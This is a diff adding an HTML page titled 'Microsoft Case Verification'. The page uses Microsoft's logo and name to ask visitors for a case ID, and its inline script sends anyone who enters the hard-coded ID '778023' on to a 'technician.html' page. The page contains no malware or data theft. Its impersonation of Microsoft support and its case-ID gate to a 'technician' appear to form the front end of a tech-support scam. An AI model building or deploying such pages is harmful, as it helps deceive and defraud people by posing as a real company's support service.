@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Microsoft Case Verification</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="header">
+    <img src="images/microsoft-logo.png" alt="Microsoft" class="logo">
+    <h1>Microsoft Case ID Verification</h1>
+  </div>
+  <div class="container">
+    <p>Please enter your Case ID to continue:</p>
+    <input type="text" id="caseId" placeholder="Enter Case ID">
+    <button onclick="verifyCase()">Verify</button>
+    <p id="error" class="error"></p>
+  </div>
+
+  <script>
+    function verifyCase() {
+      const caseId = document.getElementById('caseId').value;
+      const error = document.getElementById('error');
+      if (caseId === '778023') {
+        window.location.href = 'technician.html';
+      } else {
+        error.textContent = 'Invalid Case ID. Please try again.';
+      }
+    }
+  </script>
+</body>
+</html>
